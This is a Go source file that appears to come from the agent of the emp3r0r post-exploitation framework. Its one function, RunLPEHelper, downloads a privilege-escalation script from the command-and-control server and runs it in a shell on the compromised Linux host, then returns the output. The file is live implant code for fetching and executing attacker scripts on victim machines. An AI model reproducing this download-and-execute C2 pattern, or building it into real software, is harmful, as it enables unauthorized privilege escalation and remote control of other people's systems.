//go:build linux
// +build linux

package modules

import (
	"os"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
)

// RunLPEHelper runs helper scripts to give you hints on how to escalate privilege
func RunLPEHelper(method, checksum string) (out string) {
	logging.Printf("Downloading LPE script from %s", def.CCAddress+method)
	var scriptData []byte
	scriptData, err := c2transport.FetchFile("", method, "", checksum)
	if err != nil {
		return "Download error: " + err.Error()
	}

	// run the script
	logging.Printf("Running LPE helper %s", method)
	out, err = agentutils.ExecuteShell(scriptData, nil, os.Environ())
	if err != nil {
		return logging.Sprintf("Run LPE helper %s failed: %s %v", method, out, err)
	}

	return out
}
